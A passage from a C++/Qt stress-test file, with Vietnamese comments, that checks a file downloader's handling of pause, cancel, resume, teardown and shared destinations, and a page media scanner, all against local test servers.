            if (wantsCompletion(t) ? s != Status::Completed : (s == Status::Downloading || s == Status::Queued || s == Status::Paused))
                return false;
        }
        return true;
    };
    // Mục phải lỗi/bị hủy hẳn đang tạm dừng: hủy cho dứt điểm.
    for (const Tracked& t : items)
        if (!wantsCompletion(t) && statusOf(t.id) == Status::Paused)
            downloader->cancel(t.id);
    for (const Tracked& t : items)
        if (http.resources[t.path].mustFail() && (statusOf(t.id) == Status::Canceled || statusOf(t.id) == Status::Paused) && !t.canceledForGood)
            downloader->start(t.id);
    const bool settled = waitUntil(allSettled, 180000);
    nudge.stop();
    CHECK(settled);
    if (!settled)
    {
        int shown = 0;
        for (const Tracked& t : items)
        {
            const DownloadItem* it = downloader->item(t.id);
            if (wantsCompletion(t) && it->status != Status::Completed && shown++ < 12)
                std::printf("   KET: %s loai=%d trang thai=%d nhan=%lld/%lld loi=[%s] thu lai=%d\n", qPrintable(t.path),
                            int(http.resources[t.path].kind), int(it->status), static_cast<long long>(it->receivedBytes),
                            static_cast<long long>(it->totalBytes), qPrintable(it->error), t.retries);
        }
    }
    waitUntil([] { return false; }, 300); // cho các deleteLater()/tín hiệu trễ chạy nốt

    // ---- Đối chiếu ----
    int completed = 0, failed = 0, canceled = 0, wrongBytes = 0;
    qint64 totalBytes = 0;
    for (const Tracked& t : items)
    {
        const Resource& r = http.resources[t.path];
        const Resource& content = http.resources[t.contentPath];
        const DownloadItem* it = downloader->item(t.id);
        const QString ctxText = QString("%1 loai=%2 cham=%3 kich thuoc=%4 trang thai=%5 yeu cau=%6 (range %7) loi=[%8]")
                                    .arg(t.path).arg(int(r.kind)).arg(r.slow).arg(r.size).arg(int(it->status))
                                    .arg(content.requests).arg(content.rangeRequests).arg(it->error);
        const bool partExists = QFile::exists(t.dest + FileDownloaderInternal::kPartSuffix);
        switch (it->status)
        {
            case Status::Completed:
            {
                ++completed;
                // ĐÚNG từng byte với phiên bản máy chủ gửi ở phản hồi thành công cuối cùng.
                const QByteArray expected = contentFor(content.seed, content.servedVersion, content.size);
                const QByteArray actual = readFileBytes(t.dest);
                totalBytes += actual.size();
                const bool same = actual.size() == expected.size() && sha256(actual) == sha256(expected);
                if (!same)
                    ++wrongBytes;
                CHECK_CTX(same, ctxText + QString(" - tep %1 byte, mong doi %2 byte").arg(actual.size()).arg(expected.size()));
                CHECK_CTX(QFile::exists(t.dest), ctxText);
                CHECK_CTX(!partExists, ctxText + " - con .part mo coi");
                CHECK_CTX(it->receivedBytes == actual.size(), ctxText + QString(" - receivedBytes=%1").arg(it->receivedBytes));
                CHECK_CTX(it->totalBytes < 0 || it->totalBytes == actual.size() || r.kind == Resource::Deflate,
                          ctxText + QString(" - totalBytes=%1").arg(it->totalBytes));
                CHECK_CTX(it->error.isEmpty() && it->speedBytesPerSec == 0, ctxText);
                CHECK_CTX(wantsCompletion(t) || t.canceledForGood, ctxText);
                break;
            }
            case Status::Failed:
                ++failed;
                CHECK_CTX(r.mustFail(), ctxText);
                CHECK_CTX(!QFile::exists(t.dest), ctxText + " - muc loi ma co tep dich");
                CHECK_CTX(!partExists, ctxText + " - muc loi (khong tiep tuc duoc) con .part");
                CHECK_CTX(t.finishedOk == 0, ctxText);
                break;
            case Status::Canceled:
                ++canceled;
                CHECK_CTX(t.canceledForGood, ctxText);
                CHECK_CTX(!partExists, ctxText + " - da huy ma con .part");
                CHECK_CTX(!QFile::exists(t.dest), ctxText + " - da huy ma co tep dich");
                break;
            default:
                CHECK_CTX(false, ctxText + " - trang thai cuoi khong hop le");
                break;
        }
        CHECK_CTX(t.finishedOk == (it->status == Status::Completed ? 1 : 0), ctxText + QString(" - itemFinished(true) x%1").arg(t.finishedOk));

        // Kiểm tra phía máy chủ.
        if (content.kind == Resource::NoValidator)
            CHECK_CTX(content.rangeRequests == 0, ctxText + " - gui Range du khong co ETag/Last-Modified");
        CHECK_CTX(!content.sawWeakIfRange, ctxText + " - dung ETag yeu cho If-Range");
        if (r.kind == Resource::Hang)
            CHECK_CTX(it->status == Status::Canceled, ctxText);
    }
    CHECK(maxActiveSeen <= maxConcurrent);
    CHECK(countPartFiles(dir) == 0);
    CHECK(wrongBytes == 0);
    CHECK(completed > fileCount / 2);
    // Kịch bản phải thật sự xảy ra, nếu không bài test chẳng chứng minh được gì.
    CHECK(pauses > 0 && cancels > 0 && resumes > 0 && http.cutsDone > 0 && http.partialContentServed > 0 && reentrantActions > 0);

    // ---- Rò rỉ: không còn QNetworkReply nào sống, không còn kết nối nào mở phía máy chủ ----
    // deleteLater() gọi từ mã chạy NGOÀI vòng lặp sự kiện (các lệnh cancel() trực tiếp ở pha thu dọn phía trên)
    // chỉ được processEvents() xử lý khi có exec() - ứng dụng thật luôn có; ở đây phải tự đẩy.
    QCoreApplication::sendPostedEvents(nullptr, QEvent::DeferredDelete);
    CHECK(waitUntil([&] { return downloader->findChildren<QNetworkReply*>().isEmpty(); }, 5000));
    alive = false;
    delete downloader;
    CHECK(waitUntil([&] { return http.openConnections == 0; }, 5000));
    CHECK(countPartFiles(dir) == 0);

    std::printf("  dong thoi toi da %d (thay %d) | xong=%d loi=%d huy=%d | %lld byte dung | may chu: %d yeu cau, %d lan cat, %d phan hoi 206\n",
                maxConcurrent, maxActiveSeen, completed, failed, canceled, static_cast<long long>(totalBytes), http.totalRequests,
                http.cutsDone, http.partialContentServed);
    std::printf("  thao tac: %d tam dung, %d huy, %d bat dau lai, %d goi lai tu trong slot | hon loan %lld ms, tong %lld ms\n", pauses,
                cancels, resumes, reentrantActions, static_cast<long long>(chaosElapsed), static_cast<long long>(clock.elapsed()));
}

/// Hủy FileDownloader giữa lúc còn mục đang tải/đang tạm dừng/đang chờ: không sập, không để lại tệp .part.
static void stressDownloaderTeardown(Rng& rng, const QString& baseDir)
{
    const int rounds = scaled(12);
    std::printf("-- FileDownloader: huy doi tuong giua chung x%d\n", rounds);
    using Status = DownloadItem::Status;
    for (int round = 0; round < rounds; ++round)
    {
        const QString dir = baseDir + QString("/huy-%1").arg(round);
        QDir().mkpath(dir);
        ChaosServer http(rng.next());
        auto* downloader = new FileDownloader;
        downloader->setMaxConcurrent(4);
        QList<int> ids;
        for (int i = 0; i < 24; ++i)
        {
            Resource r;
            r.seed = rng.next() % 1000003ULL + 1;
            r.size = rng.range(200 * 1024, 900 * 1024);
            r.kind = rng.chance(20) ? Resource::NoValidator : rng.chance(10) ? Resource::Hang : Resource::Ok;
            r.slow = true;
            const QString path = QString("/h/%1").arg(i);
            http.resources.insert(path, r);
            ids << downloader->enqueue(http.url(path), dir + QString("/tep-%1.bin").arg(i));
            downloader->start(ids.last());
        }
        // Chờ tới khi vài mục đã có dữ liệu, tạm dừng một số (tệp .part của chúng nằm lại trên đĩa), rồi hủy tất cả.
        waitUntil([&] {
            int withData = 0;
            for (int id : ids) withData += downloader->item(id)->receivedBytes > 0 ? 1 : 0;
            return withData >= 3;
        }, 8000);
        int paused = 0;
        for (int id : ids)
        {
            if (downloader->item(id)->status == Status::Downloading && rng.chance(50))
            {
                downloader->pause(id);
                ++paused;
            }
        }
        waitUntil([] { return false; }, rng.range(0, 60));
        const int partsBefore = countPartFiles(dir);
        delete downloader;
        waitUntil([&] { return http.openConnections == 0; }, 5000);
        const QString ctx = QString("vong %1: %2 muc tam dung, %3 tep .part truoc khi huy").arg(round).arg(paused).arg(partsBefore);
        CHECK_CTX(partsBefore > 0, ctx);
        CHECK_CTX(http.openConnections == 0, ctx);
        // Phiên sau không còn thông tin nào để tiếp tục (ETag chỉ nằm trong bộ nhớ) - tệp .part để lại là rác.
        CHECK_CTX(countPartFiles(dir) == 0, ctx + QString(" - con %1 tep .part sau khi huy").arg(countPartFiles(dir)));
    }
}

/// Hai mục cùng nhắm MỘT đường dẫn đích: tệp cuối cùng phải là nội dung trọn vẹn của đúng một mục báo xong.
static void stressSameDestination(Rng& rng, const QString& baseDir)
{
    const int rounds = scaled(25);
    std::printf("-- FileDownloader: hai muc cung dich x%d\n", rounds);
    using Status = DownloadItem::Status;
    int bothCompleted = 0, oneRejected = 0;
    for (int round = 0; round < rounds; ++round)
    {
        const QString dir = baseDir + QString("/cung-dich-%1").arg(round);
        QDir().mkpath(dir);
        ChaosServer http(rng.next());
        Resource a, b;
        a.seed = rng.next() % 1000003ULL + 1;
        b.seed = a.seed + 7;
        a.size = rng.range(100 * 1024, 500 * 1024);
        b.size = rng.range(100 * 1024, 500 * 1024);
        a.slow = b.slow = true;
        http.resources.insert("/a", a);
        http.resources.insert("/b", b);

        FileDownloader downloader;
        const QString dest = dir + "/Chung.bin";
        const int idA = downloader.enqueue(http.url("/a"), dest);
        // Cùng tệp, viết khác kiểu chữ + có "./" thừa - Windows coi là một.
        const int idB = downloader.enqueue(http.url("/b"), rng.chance(50) ? dest : dir + "/./chung.BIN");
        downloader.start(idA);
        if (rng.chance(50))
            waitUntil([&] { return downloader.item(idA)->receivedBytes > 0; }, 5000);
        downloader.start(idB);

        auto terminal = [&](int id) {
            const Status s = downloader.item(id)->status;
            return s == Status::Completed || s == Status::Failed;
        };
        CHECK(waitUntil([&] { return terminal(idA) && terminal(idB); }, 30000));
        const Status sa = downloader.item(idA)->status, sb = downloader.item(idB)->status;
        const QByteArray actual = readFileBytes(dest);
        const QByteArray contentA = contentFor(a.seed, 0, a.size), contentB = contentFor(b.seed, 0, b.size);
        const QString ctx = QString("vong %1: A=%2 [%3] B=%4 [%5], tep %6 byte (A %7, B %8)")
                                .arg(round).arg(int(sa)).arg(downloader.item(idA)->error).arg(int(sb)).arg(downloader.item(idB)->error)
                                .arg(actual.size()).arg(a.size).arg(b.size);
        CHECK_CTX(sa == Status::Completed || sb == Status::Completed, ctx);
        // Tệp đích là nội dung TRỌN VẸN của một mục đã báo xong - không phải trộn lẫn hai luồng ghi.
        const bool isA = sa == Status::Completed && actual == contentA;
        const bool isB = sb == Status::Completed && actual == contentB;
        CHECK_CTX(isA || isB, ctx);
        if (sa == Status::Completed && sb == Status::Completed) ++bothCompleted; else ++oneRejected;
        CHECK_CTX(countPartFiles(dir) == 0, ctx);
    }
    std::printf("  ca hai xong (lan luot): %d, mot muc bi tu choi: %d\n", bothCompleted, oneRejected);
}

/// PageMediaScanner THẬT: trang 12 MB (bị cắt ở 10 MB) vẫn ra kết quả trong ngưỡng thời gian.
static void stressPageScannerLive(Rng& rng)
{
    std::printf("-- PageMediaScanner: quet that mot trang 12 MB qua 127.0.0.1\n");
    Q_UNUSED(rng);
    QTcpServer server;
    QByteArray page = "<html><body>";
    int tags = 0;
    while (page.size() < 12 * 1024 * 1024)
    {
        page += "<p>" + QByteArray(180, 'x') + "</p><img src=\"/anh/" + QByteArray::number(tags) + ".jpg\">\n";
        ++tags;
    }
    QObject::connect(&server, &QTcpServer::newConnection, &server, [&]() {
        while (QTcpSocket* sock = server.nextPendingConnection())
        {
            QObject::connect(sock, &QTcpSocket::disconnected, sock, &QObject::deleteLater);
            QObject::connect(sock, &QTcpSocket::readyRead, sock, [sock, &page]() {
                if (!sock->readAll().contains("\r\n\r\n"))
                    return;
                sock->write("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: " +
                            QByteArray::number(page.size()) + "\r\n\r\n" + page);
                sock->disconnectFromHost();
            });
        }
    });
    CHECK(server.listen(QHostAddress::LocalHost, 0));

    PageMediaScanner scanner;
    int results = 0, errors = 0;
    qsizetype linkCount = 0;
    QObject::connect(&scanner, &PageMediaScanner::result, &scanner, [&](QList<MediaLink> links) { ++results; linkCount = links.size(); });
    QObject::connect(&scanner, &PageMediaScanner::errorOccurred, &scanner, [&](QString) { ++errors; });
    for (int round = 0; round < 3; ++round)
    {
        results = errors = 0;
        const qint64 ms = timedMs([&] {
            scanner.scan(QString("http://127.0.0.1:%1/trang.html").arg(server.serverPort()));
            scanner.scan("http://127.0.0.1:1/bi-bo-qua"); // đang bận - phải bị bỏ qua, không sinh tín hiệu thứ hai
            waitUntil([&] { return results + errors > 0; }, 20000);
        });
        const QString ctx = QString("vong %1: %2 ms, %3 lien ket / %4 the").arg(round).arg(ms).arg(linkCount).arg(tags);
        CHECK_CTX(results == 1 && errors == 0, ctx);
        CHECK_CTX(linkCount > tags / 2 && linkCount < tags, ctx); // chỉ phần 10 MB đầu được phân tích
        CHECK_CTX(ms < 8000, ctx);
        if (round == 0)
            std::printf("  %s\n", qPrintable(ctx));
    }
    waitUntil([] { return false; }, 100);
    CHECK(scanner.findChildren<QNetworkReply*>().isEmpty());
}

int main(int argc, char** argv)
{
    QCoreApplication app(argc, argv);
    std::setvbuf(stdout, nullptr, _IONBF, 0);

    QTemporaryDir tmp;
    if (!tmp.isValid())
    {
        std::printf("Khong tao duoc thu muc tam\n");
        return 2;
    }
    AppPaths::setDataDirOverride(tmp.path());

    const QStringList args = app.arguments();
    const quint64 seed = args.size() > 1 ? args[1].toULongLong() : 20261009ULL;
    if (args.size() > 2)
        g_scale = qBound(1, args[2].toInt(), 1000);
    const QString only = args.size() > 3 ? args[3] : QString(); // chỉ chạy một nhóm (để dò lỗi)
    std::printf("secdl_stress_tests: hat giong=%llu, ti le=%d%%\n", static_cast<unsigned long long>(seed), g_scale);

    QElapsedTimer total;
    total.start();
    auto run = [&](const char* name, const std::function<void(Rng&)>& body) {
        if (!only.isEmpty() && only != name)
            return;
        // Mỗi nhóm một bộ sinh riêng (hạt giống + tên nhóm) - chạy riêng một nhóm vẫn ra đúng dãy đầu vào đó.
        Rng rng(seed ^ qHash(QByteArray(name)));
        const int failBefore = g_fail;
        const qint64 ms = timedMs([&] { body(rng); });
        std::printf("   => %s: %lld ms, %s\n", name, static_cast<long long>(ms), g_fail == failBefore ? "dat" : "CO LOI");
    };

    run("analyzer-big", stressAnalyzerBigInputs);
    run("analyzer-random", stressAnalyzerRandom);
    run("hosts-pure", stressHostsPure);
    run("hosts-domain", stressNormalizeDomain);
    run("hosts-files", [&](Rng& rng) { stressHostsFiles(rng, tmp.path()); });
    run("media-links", stressExtractMediaLinks);
    run("file-names", stressFileNames);
    run("parsers", stressParsers);
    run("page-scan", stressPageScannerLive);
    run("downloader", [&](Rng& rng) { stressFileDownloader(rng, tmp.path()); });
    run("downloader-teardown", [&](Rng& rng) { stressDownloaderTeardown(rng, tmp.path()); });
    run("downloader-same-dest", [&](Rng& rng) { stressSameDestination(rng, tmp.path()); });

    std::printf("tong thoi gian: %lld ms\n", static_cast<long long>(total.elapsed()));
    std::printf("passed=%d failed=%d\n", g_pass, g_fail);
    return g_fail == 0 ? 0 : 1;
}
